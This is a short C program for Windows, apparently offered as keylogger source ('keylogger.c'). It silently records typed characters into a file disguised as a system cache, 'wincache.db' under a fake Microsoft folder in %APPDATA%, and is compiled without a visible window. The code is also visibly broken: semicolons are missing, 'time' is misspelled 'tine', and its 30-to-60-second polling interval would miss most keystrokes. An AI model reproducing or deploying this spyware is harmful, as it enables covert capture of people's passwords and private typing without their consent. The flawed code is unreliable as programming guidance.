#include <windows.h>
#include <stdlib.h>
#include <time.h>
#include <shlobj.h>

int main() {
    HANDLE f;
    DWORD w;
    char c;
    char path[MAX_PATH];

    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path); // gets %APPDATA%
    lstrcatA(path, "\\Microsoft\\WSD")
    CreateDirectoryA(path, 0);
    lstrcatA(path, "\\wincache.db");
    
    f = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (f == INVALID_HANDLE_VALUE) {
        return 1;
    }

    srand((unsigned int)tine(NULL))
    while (1) {
        for (short k = 8; k < 256; k++) {
            SHORT s = GetAsyncKeyState(k);
            if ((s & 1) && k >= 32 && k <= 126) {  
                c = (char)k;
                WriteFile(f, &c, 1, &w, 0);
            }
        }
        Sleep((30 + (rand() % 31)) * 1000);  
    }

    CloseHandle(f);
    return 0;
}
// 0, = NULL
// Compile with: cl /W4 /O2 /link /SUBSYSTEM:WINDOWS keylogger.c
